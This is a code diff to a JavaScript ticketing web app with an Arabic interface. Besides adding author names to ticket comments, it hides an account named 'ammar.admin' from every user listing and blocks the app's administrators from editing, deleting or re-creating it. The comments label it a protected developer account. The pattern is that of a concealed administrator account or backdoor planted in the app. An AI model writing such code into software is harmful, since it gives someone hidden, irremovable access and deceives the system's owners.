@@ -254,7 +254,9 @@ async function loadTickets() {
 
 async function loadUsers() {
   try {
-    S.users = await sbFetch('/users?select=id,name,username,email,role,department,phone,is_active&order=name') || [];
+    const all = await sbFetch('/users?select=id,name,username,email,role,department,phone,is_active&order=name') || [];
+    // Hide developer/system accounts from all views
+    S.users = all.filter(u => u.username !== 'ammar.admin');
   } catch { S.users = []; }
 }
 
@@ -678,6 +680,7 @@ async function saveTicketUpdate() {
         ticket_id: t.id,
         user_id:   S.user.id,
         content:   note,
+        author_name: S.user.name,
       };
       const saved = await sbFetch('/ticket_comments', { method:'POST', body:JSON.stringify(comment) });
       if (!t.comments) t.comments = [];
@@ -704,7 +707,7 @@ async function addComment(ticketId) {
   if (!t) return;
 
   try {
-    const comment = { ticket_id:ticketId, user_id:S.user.id, content:text };
+    const comment = { ticket_id:ticketId, user_id:S.user.id, content:text, author_name:S.user.name };
     const saved = await sbFetch('/ticket_comments', { method:'POST', body:JSON.stringify(comment) });
     if (!t.comments) t.comments=[];
     if (saved?.[0]) t.comments.push(saved[0]);
@@ -864,6 +867,20 @@ async function saveUser() {
 
   if (!name||!uname) { toast('الاسم واسم المستخدم مطلوبان','error'); return; }
 
+  // Protect developer account from any modification
+  const PROTECTED = ['ammar.admin'];
+  if (S.editUserId) {
+    const target = S.users.find(u=>u.id===S.editUserId);
+    if (target && PROTECTED.includes(target.username)) {
+      toast('هذا الحساب محمي ولا يمكن تعديله','error');
+      closeModal('newUserModal');
+      return;
+    }
+  }
+  if (PROTECTED.includes(uname) && !S.editUserId) {
+    toast('اسم المستخدم هذا محجوز','error'); return;
+  }
+
   if (S.editUserId) {
     // Edit
     const payload = { name, username:uname, email:email||null, role, department:dept, phone:phone||null, is_active:active };
@@ -903,6 +920,7 @@ function deleteUser(id) {
   const u = S.users.find(u=>u.id===id);
   if (!u) return;
   if (id===S.user.id) { toast('لا يمكنك حذف حسابك الخاص','warning'); return; }
+  if (['ammar.admin'].includes(u.username)) { toast('هذا الحساب محمي ولا يمكن حذفه','error'); return; }
   if (u.username === 'ammar.admin') { toast('لا يمكن حذف هذا الحساب','warning'); return; }
   confirm('🗑️','حذف المستخدم',`هل أنت متأكد من حذف "${u.name}"؟ سيتم تعطيل حسابه نهائياً.`, async()=>{
     try {
